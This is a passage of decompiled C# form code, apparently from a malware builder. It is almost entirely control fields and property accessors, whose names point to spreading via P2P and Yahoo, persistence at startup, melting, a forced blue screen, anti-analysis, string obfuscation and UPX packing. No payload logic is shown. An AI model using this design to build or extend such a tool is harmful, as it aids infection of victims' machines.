		private Label _Label1;

		[AccessedThroughProperty("Anti")]
		private CheckBox _Anti;

		[AccessedThroughProperty("Spre")]
		private CheckBox _Spre;

		[AccessedThroughProperty("GroupBox2")]
		private GroupBox _GroupBox2;

		[AccessedThroughProperty("ty8")]
		private CheckBox _ty8;

		[AccessedThroughProperty("GroupBox3")]
		private GroupBox _GroupBox3;

		[AccessedThroughProperty("GroupBox5")]
		private GroupBox _GroupBox5;

		[AccessedThroughProperty("GroupBox6")]
		private GroupBox _GroupBox6;

		[AccessedThroughProperty("GroupBox7")]
		private GroupBox _GroupBox7;

		[AccessedThroughProperty("CheckBox2")]
		private CheckBox _CheckBox2;

		[AccessedThroughProperty("PictureBox2")]
		private PictureBox _PictureBox2;

		[AccessedThroughProperty("PictureBox3")]
		private PictureBox _PictureBox3;

		[AccessedThroughProperty("TabControl1")]
		private TabControl _TabControl1;

		[AccessedThroughProperty("TabPage1")]
		private TabPage _TabPage1;

		[AccessedThroughProperty("TabPage2")]
		private TabPage _TabPage2;

		[AccessedThroughProperty("Label7")]
		private Label _Label7;

		[AccessedThroughProperty("TabPage3")]
		private TabPage _TabPage3;

		[AccessedThroughProperty("TabPage4")]
		private TabPage _TabPage4;

		[AccessedThroughProperty("Label14")]
		private Label _Label14;

		[AccessedThroughProperty("Label13")]
		private Label _Label13;

		[AccessedThroughProperty("Num8")]
		private NumericUpDown _Num8;

		[AccessedThroughProperty("Num7")]
		private NumericUpDown _Num7;

		[AccessedThroughProperty("Num6")]
		private NumericUpDown _Num6;

		[AccessedThroughProperty("Num5")]
		private NumericUpDown _Num5;

		[AccessedThroughProperty("Num4")]
		private NumericUpDown _Num4;

		[AccessedThroughProperty("Num3")]
		private NumericUpDown _Num3;

		[AccessedThroughProperty("Num2")]
		private NumericUpDown _Num2;

		[AccessedThroughProperty("Num1")]
		private NumericUpDown _Num1;

		[AccessedThroughProperty("Label12")]
		private Label _Label12;

		[AccessedThroughProperty("Label11")]
		private Label _Label11;

		[AccessedThroughProperty("Label10")]
		private Label _Label10;

		[AccessedThroughProperty("Label9")]
		private Label _Label9;

		[AccessedThroughProperty("Label8")]
		private Label _Label8;

		[AccessedThroughProperty("TextBox6")]
		private TextBox _TextBox6;

		[AccessedThroughProperty("TextBox5")]
		private TextBox _TextBox5;

		[AccessedThroughProperty("TextBox4")]
		private TextBox _TextBox4;

		[AccessedThroughProperty("TextBox3")]
		private TextBox _TextBox3;

		[AccessedThroughProperty("TabPage5")]
		private TabPage _TabPage5;

		[AccessedThroughProperty("GroupBox1")]
		private GroupBox _GroupBox1;

		[AccessedThroughProperty("TabPage6")]
		private TabPage _TabPage6;

		[AccessedThroughProperty("TabPage7")]
		private TabPage _TabPage7;

		[AccessedThroughProperty("imm")]
		private ImageList _imm;

		[AccessedThroughProperty("GroupBox4")]
		private GroupBox _GroupBox4;

		[AccessedThroughProperty("GroupBox9")]
		private GroupBox _GroupBox9;

		[AccessedThroughProperty("txt_encription")]
		private TextBox _txt_encription;

		[AccessedThroughProperty("Label16")]
		private Label _Label16;

		[AccessedThroughProperty("Label15")]
		private Label _Label15;

		[AccessedThroughProperty("txt_port")]
		private TextBox _txt_port;

		[AccessedThroughProperty("NyX_Theme1")]
		private NYX_Theme _NyX_Theme1;

		[AccessedThroughProperty("NyX_ProgressBar1")]
		private NYX_ProgressBar _NyX_ProgressBar1;

		[AccessedThroughProperty("NyX_ControlBox1")]
		private NYX_ControlBox _NyX_ControlBox1;

		[AccessedThroughProperty("Label17")]
		private Label _Label17;

		[AccessedThroughProperty("CBTamanhoICO")]
		private ComboBox _CBTamanhoICO;

		[AccessedThroughProperty("LVIcones")]
		private ListView _LVIcones;

		[AccessedThroughProperty("ColumnHeader2")]
		private ColumnHeader _ColumnHeader2;

		[AccessedThroughProperty("ColumnHeader3")]
		private ColumnHeader _ColumnHeader3;

		[AccessedThroughProperty("IM3")]
		private ImageList _IM3;

		[AccessedThroughProperty("NyX_Button1")]
		private NYX_Button _NyX_Button1;

		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		[AccessedThroughProperty("Label18")]
		private Label _Label18;

		[AccessedThroughProperty("CBIcones")]
		private ComboBox _CBIcones;

		[AccessedThroughProperty("CKUpx")]
		private CheckBox _CKUpx;

		[AccessedThroughProperty("TabPage8")]
		private TabPage _TabPage8;

		[AccessedThroughProperty("CheckBox3")]
		private CheckBox _CheckBox3;

		[AccessedThroughProperty("Rpool")]
		private NSRandomPool _Rpool;

		[AccessedThroughProperty("txtStringOfuscador")]
		private TextBox _txtStringOfuscador;

		[AccessedThroughProperty("NumericUpDown1")]
		private NumericUpDown _NumericUpDown1;

		[AccessedThroughProperty("CM_Obfs")]
		private ComboBox _CM_Obfs;

		[AccessedThroughProperty("Label19")]
		private Label _Label19;

		[AccessedThroughProperty("GroupBox11")]
		private GroupBox _GroupBox11;

		[AccessedThroughProperty("Label20")]
		private Label _Label20;

		[AccessedThroughProperty("Label6")]
		private Label _Label6;

		[AccessedThroughProperty("CH_Infect")]
		private CheckBox _CH_Infect;

		[AccessedThroughProperty("Melt")]
		private CheckBox _Melt;

		[AccessedThroughProperty("PictureBox4")]
		private PictureBox _PictureBox4;

		[AccessedThroughProperty("CH_p2p")]
		private CheckBox _CH_p2p;

		[AccessedThroughProperty("CM_Yahoo")]
		private CheckBox _CM_Yahoo;

		[AccessedThroughProperty("Label23")]
		private Label _Label23;

		[AccessedThroughProperty("Label22")]
		private Label _Label22;

		[AccessedThroughProperty("Label21")]
		private Label _Label21;

		[AccessedThroughProperty("LinkLabel6")]
		private LinkLabel _LinkLabel6;

		[AccessedThroughProperty("LinkLabel5")]
		private LinkLabel _LinkLabel5;

		[AccessedThroughProperty("LinkLabel4")]
		private LinkLabel _LinkLabel4;

		[AccessedThroughProperty("LinkLabel3")]
		private LinkLabel _LinkLabel3;

		[AccessedThroughProperty("LinkLabel2")]
		private LinkLabel _LinkLabel2;

		[AccessedThroughProperty("LinkLabel1")]
		private LinkLabel _LinkLabel1;

		[AccessedThroughProperty("lbl_icones")]
		private Label _lbl_icones;

		[AccessedThroughProperty("NyX_Button3")]
		private NYX_Button _NyX_Button3;

		[AccessedThroughProperty("NyX_Button2")]
		private NYX_Button _NyX_Button2;

		[AccessedThroughProperty("dir")]
		private ComboBox _dir;

		[AccessedThroughProperty("exe")]
		private TextBox _exe;

		[AccessedThroughProperty("Note")]
		private Label _Note;

		[AccessedThroughProperty("Anti_CH")]
		private CheckBox _Anti_CH;

		[AccessedThroughProperty("Tree2")]
		private TreeView _Tree2;

		[AccessedThroughProperty("tree1")]
		private TreeView _tree1;

		[AccessedThroughProperty("PictureBox1")]
		private PictureBox _PictureBox1;

		[AccessedThroughProperty("CheckBox1")]
		private CheckBox _CheckBox1;

		[AccessedThroughProperty("TextBox2")]
		private TextBox _TextBox2;

		[AccessedThroughProperty("CheckBox12")]
		private CheckBox _CheckBox12;

		[AccessedThroughProperty("Button2")]
		private Button _Button2;

		[AccessedThroughProperty("Button3")]
		private Button _Button3;

		[AccessedThroughProperty("bsod")]
		private CheckBox _bsod;

		[AccessedThroughProperty("startup")]
		private CheckBox _startup;

		[AccessedThroughProperty("reg99")]
		private CheckBox _reg99;

		[AccessedThroughProperty("Del")]
		private CheckBox _Del;

		[AccessedThroughProperty("CheckBox4")]
		private CheckBox _CheckBox4;

		private string ic;

		internal virtual TextBox T1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._T1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._T1 = value;
			}
		}

		internal virtual CheckBox rnz
		{
			[DebuggerNonUserCode]
			get
			{
				return this._rnz;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._rnz = value;
			}
		}

		internal virtual CheckBox US
		{
			[DebuggerNonUserCode]
			get
			{
				return this._US;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.US_CheckedChanged);
				bool flag = this._US != null;
				if (flag)
				{
					this._US.CheckedChanged -= value2;
				}
				this._US = value;
				flag = (this._US != null);
				if (flag)
				{
					this._US.CheckedChanged += value2;
				}
			}
		}

		internal virtual Label Label5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label5 = value;
			}
		}

		internal virtual Label Label4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label4 = value;
			}
		}

		internal virtual TextBox VN
		{
			[DebuggerNonUserCode]
			get
			{
				return this._VN;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._VN = value;
			}
		}

		internal virtual Label Label3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label3 = value;
			}
		}

		internal virtual NumericUpDown port
		{
			[DebuggerNonUserCode]
			get
			{
				return this._port;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.port_ValueChanged);
				bool flag = this._port != null;
				if (flag)
				{
					this._port.ValueChanged -= value2;
				}
				this._port = value;
				flag = (this._port != null);
				if (flag)
				{
					this._port.ValueChanged += value2;
				}
			}
		}

		internal virtual TextBox host
		{
			[DebuggerNonUserCode]
			get
			{
				return this._host;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.host_TextChanged);
				bool flag = this._host != null;
				if (flag)
				{
					this._host.TextChanged -= value2;
				}
				this._host = value;
				flag = (this._host != null);
				if (flag)
				{
					this._host.TextChanged += value2;
				}
			}
		}

		internal virtual Label Label2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label2 = value;
			}
		}

		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		internal virtual CheckBox Anti
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Anti;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Anti = value;
			}
		}

		internal virtual CheckBox Spre
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Spre;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Spre_CheckedChanged);
				bool flag = this._Spre != null;
				if (flag)
				{
					this._Spre.CheckedChanged -= value2;
				}
				this._Spre = value;
				flag = (this._Spre != null);
				if (flag)
				{
					this._Spre.CheckedChanged += value2;
				}
			}
		}

		internal virtual GroupBox GroupBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox2 = value;
			}
		}

		internal virtual CheckBox ty8
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ty8;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ty8_CheckedChanged);
				bool flag = this._ty8 != null;
				if (flag)
				{
					this._ty8.CheckedChanged -= value2;
				}
				this._ty8 = value;
				flag = (this._ty8 != null);
				if (flag)
				{
					this._ty8.CheckedChanged += value2;
				}
			}
		}

		internal virtual GroupBox GroupBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox3 = value;
			}
		}

		internal virtual GroupBox GroupBox5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox5 = value;
			}
		}

		internal virtual GroupBox GroupBox6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox6 = value;
			}
		}

		internal virtual GroupBox GroupBox7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox7 = value;
			}
		}

		internal virtual CheckBox CheckBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CheckBox2_CheckedChanged_1);
				bool flag = this._CheckBox2 != null;
				if (flag)
				{
					this._CheckBox2.CheckedChanged -= value2;
				}
				this._CheckBox2 = value;
				flag = (this._CheckBox2 != null);
				if (flag)
				{
					this._CheckBox2.CheckedChanged += value2;
				}
			}
		}

		internal virtual PictureBox PictureBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox2 = value;
			}
		}

		internal virtual PictureBox PictureBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox3 = value;
			}
		}

		internal virtual TabControl TabControl1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TabControl1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TabControl1 = value;
			}
		}

		internal virtual TabPage TabPage1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TabPage1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TabPage1 = value;
			}
		}

		internal virtual TabPage TabPage2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TabPage2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TabPage2 = value;
			}
		}

		internal virtual Label Label7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label7 = value;
			}
		}

		internal virtual TabPage TabPage3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TabPage3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TabPage3 = value;
			}
		}

		internal virtual TabPage TabPage4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TabPage4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TabPage4 = value;
			}
		}

		internal virtual Label Label14
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label14;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label14 = value;
			}
		}

		internal virtual Label Label13
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label13;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label13 = value;
			}
		}

		internal virtual NumericUpDown Num8
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Num8;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Num8 = value;
			}
		}

		internal virtual NumericUpDown Num7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Num7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Num7 = value;
			}
		}

		internal virtual NumericUpDown Num6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Num6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Num6 = value;
			}
		}

		internal virtual NumericUpDown Num5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Num5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Num5 = value;
			}
		}

		internal virtual NumericUpDown Num4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Num4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Num4 = value;
			}
		}

		internal virtual NumericUpDown Num3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Num3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Num3 = value;
			}
		}

		internal virtual NumericUpDown Num2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Num2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Num2 = value;
			}
		}

		internal virtual NumericUpDown Num1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Num1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Num1 = value;
			}
		}

		internal virtual Label Label12
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label12;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label12 = value;
			}
		}

		internal virtual Label Label11
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label11;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label11 = value;
			}
		}

		internal virtual Label Label10
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label10;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label10 = value;
			}
		}

		internal virtual Label Label9
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label9;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label9 = value;
			}
		}

		internal virtual Label Label8
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label8;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label8 = value;
			}
		}

		internal virtual TextBox TextBox6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox6 = value;
			}
		}

		internal virtual TextBox TextBox5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox5 = value;
			}
		}

		internal virtual TextBox TextBox4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox4 = value;
			}
		}

		internal virtual TextBox TextBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox3 = value;
			}
		}

		internal virtual TabPage TabPage5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TabPage5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TabPage5 = value;
			}
		}

		internal virtual GroupBox GroupBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox1 = value;
			}
		}

		internal virtual TabPage TabPage6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TabPage6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TabPage6 = value;
			}
		}

		internal virtual TabPage TabPage7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TabPage7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TabPage7 = value;
			}
		}

		internal virtual ImageList imm
		{
			[DebuggerNonUserCode]
			get
			{
				return this._imm;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._imm = value;
			}
		}

		internal virtual GroupBox GroupBox4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox4 = value;
			}
		}

		internal virtual GroupBox GroupBox9
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox9;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox9 = value;
			}
		}

		internal virtual TextBox txt_encription
		{
			[DebuggerNonUserCode]
			get
			{
				return this._txt_encription;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._txt_encription = value;
			}
		}

		internal virtual Label Label16
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label16;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label16 = value;
			}
		}

		internal virtual Label Label15
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label15;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label15 = value;
			}
		}

		internal virtual TextBox txt_port
		{
			[DebuggerNonUserCode]
			get
			{
				return this._txt_port;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._txt_port = value;
			}
		}

		internal virtual NYX_Theme NyX_Theme1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NyX_Theme1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.NyX_Theme1_Click);
				bool flag = this._NyX_Theme1 != null;
				if (flag)
				{
					this._NyX_Theme1.Click -= value2;
				}
				this._NyX_Theme1 = value;
				flag = (this._NyX_Theme1 != null);
				if (flag)
				{
					this._NyX_Theme1.Click += value2;
				}
			}
		}

		internal virtual NYX_ProgressBar NyX_ProgressBar1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NyX_ProgressBar1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._NyX_ProgressBar1 = value;
			}
		}

		internal virtual NYX_ControlBox NyX_ControlBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NyX_ControlBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._NyX_ControlBox1 = value;
			}
		}

		internal virtual Label Label17
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label17;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label17 = value;
			}
		}

		internal virtual ComboBox CBTamanhoICO
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CBTamanhoICO;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CBTamanhoICO_SelectedIndexChanged);
				bool flag = this._CBTamanhoICO != null;
				if (flag)
				{
					this._CBTamanhoICO.SelectedIndexChanged -= value2;
				}
				this._CBTamanhoICO = value;
				flag = (this._CBTamanhoICO != null);
				if (flag)
				{
					this._CBTamanhoICO.SelectedIndexChanged += value2;
				}
			}
		}

		internal virtual ListView LVIcones
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LVIcones;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.LVIcones_SelectedIndexChanged);
				bool flag = this._LVIcones != null;
				if (flag)
				{
					this._LVIcones.SelectedIndexChanged -= value2;
				}
				this._LVIcones = value;
				flag = (this._LVIcones != null);
				if (flag)
				{
					this._LVIcones.SelectedIndexChanged += value2;
				}
			}
		}

		internal virtual ColumnHeader ColumnHeader2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader2 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader3 = value;
			}
		}

		internal virtual ImageList IM3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._IM3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._IM3 = value;
			}
		}

		internal virtual NYX_Button NyX_Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NyX_Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.NyX_Button1_Click_1);
				bool flag = this._NyX_Button1 != null;
				if (flag)
				{
					this._NyX_Button1.Click -= value2;
				}
				this._NyX_Button1 = value;
				flag = (this._NyX_Button1 != null);
				if (flag)
				{
					this._NyX_Button1.Click += value2;
				}
			}
		}

		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click_1);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				flag = (this._Button1 != null);
				if (flag)
				{
					this._Button1.Click += value2;
				}
			}
		}

		internal virtual Label Label18
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label18;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label18 = value;
			}
		}

		internal virtual ComboBox CBIcones
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CBIcones;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CBIcones_SelectedIndexChanged);
				bool flag = this._CBIcones != null;
				if (flag)
				{
					this._CBIcones.SelectedIndexChanged -= value2;
				}
				this._CBIcones = value;
				flag = (this._CBIcones != null);
				if (flag)
				{
					this._CBIcones.SelectedIndexChanged += value2;
				}
			}
		}

		internal virtual CheckBox CKUpx
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CKUpx;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CKUpx = value;
			}
		}

		internal virtual TabPage TabPage8
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TabPage8;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TabPage8 = value;
			}
		}

		internal virtual CheckBox CheckBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CheckBox3_CheckedChanged);
				bool flag = this._CheckBox3 != null;
				if (flag)
				{
					this._CheckBox3.CheckedChanged -= value2;
				}
				this._CheckBox3 = value;
				flag = (this._CheckBox3 != null);
				if (flag)
				{
					this._CheckBox3.CheckedChanged += value2;
				}
			}
		}

		internal virtual NSRandomPool Rpool
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Rpool;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				NSRandomPool.ValueChangedEventHandler obj = new NSRandomPool.ValueChangedEventHandler(this.Rpool_ValueChanged);
				bool flag = this._Rpool != null;
				if (flag)
				{
					this._Rpool.ValueChanged -= obj;
				}
				this._Rpool = value;
				flag = (this._Rpool != null);
				if (flag)
				{
					this._Rpool.ValueChanged += obj;
				}
			}
		}

		internal virtual TextBox txtStringOfuscador
		{
			[DebuggerNonUserCode]
			get
			{
				return this._txtStringOfuscador;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._txtStringOfuscador = value;
			}
		}

		internal virtual NumericUpDown NumericUpDown1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NumericUpDown1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._NumericUpDown1 = value;
			}
		}

		internal virtual ComboBox CM_Obfs
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CM_Obfs;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CM_Obfs = value;
			}
		}

		internal virtual Label Label19
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label19;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label19 = value;
			}
		}

		internal virtual GroupBox GroupBox11
		{
